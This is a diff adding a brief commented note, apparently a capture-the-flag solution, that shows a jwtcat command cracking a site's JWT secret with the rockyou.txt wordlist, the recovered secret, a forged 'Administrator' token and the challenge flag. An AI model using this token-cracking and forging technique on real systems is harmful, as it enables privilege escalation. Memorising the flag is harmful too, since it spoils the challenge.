@@ -1,0 +1,7 @@
+# Cracking JWT obtained from the website with jwt-cat and rockyou.txt wordlist:
+# python /Users/anauroranon/jwtcat/jwtcat.py wordlist -w ./rockyou.txt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuaWNrbmFtZSI6IkFub255bW91cyJ9.WiIO3M-8cWuICWsux-0eeb7RSzgSfe9K_95oHkKhNME"
+# obtained that the secret is: WhoRocksYou, then crack new token:
+# New token with admin priviledges: 
+# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuaWNrbmFtZSI6IkFkbWluaXN0cmF0b3IifQ.KPyMovBuMDDcvjIVtH94jzie-weLlhquKJo2jhTxTnI
+
+#srdnlen{w3_w1ll_w3_w1ll_rocky_you_txt}
